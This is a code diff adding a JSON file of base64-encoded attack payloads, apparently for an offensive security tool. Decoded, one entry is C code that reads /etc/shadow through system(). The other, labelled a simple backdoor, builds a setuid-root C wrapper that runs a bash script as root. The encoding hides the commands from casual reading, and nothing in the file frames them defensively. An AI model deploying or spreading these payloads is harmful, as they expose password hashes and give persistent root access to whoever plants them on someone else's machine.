@@ -1,0 +1,18 @@
+{
+    "command": {
+        "c_system_command": {
+            "description": "Execute system command in C",
+            "commands": [
+                "I2luY2x1ZGUgPHN0ZGxpYi5oPgppbnQgc3RhdHVzID0gc3lzdGVtKCJjYXQgL2V0Yy9zaGFkb3ciKTs="
+            ]
+        },
+        "c_simple_backdoor": {
+            "description": "Simple C backdoor execution as uid 0",
+            "commands": [
+                "JCBjYXQgd3JhcHBlci5jIAppbnQgbWFpbih2b2lkKSAKeyAKICAgICAgICBzZXR1aWQoMCk7CiAgICAgICAgc3lzdGVtKCIvYmluL2Jhc2ggLi9zaG91bGRfcnVuX2FzX3Jvb3Quc2giKTsgCn0gCiQgZ2NjIC1vIHdyYXBwZXIgd3JhcHBlci5jIAokIHN1ZG8gY2hvd24gcm9vdCB3cmFwcGVyIAokIHN1ZG8gY2htb2QgdWcrcyB3cmFwcGVyIAokIGxsIHdyYXBwZXIgCi1yd3NyLXNyLXggMSByb290IHVzZXJzIDY2NjcgMjAwOS0wMi0xNyAxMToxMSB3cmFwcGVyIAokIAo="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
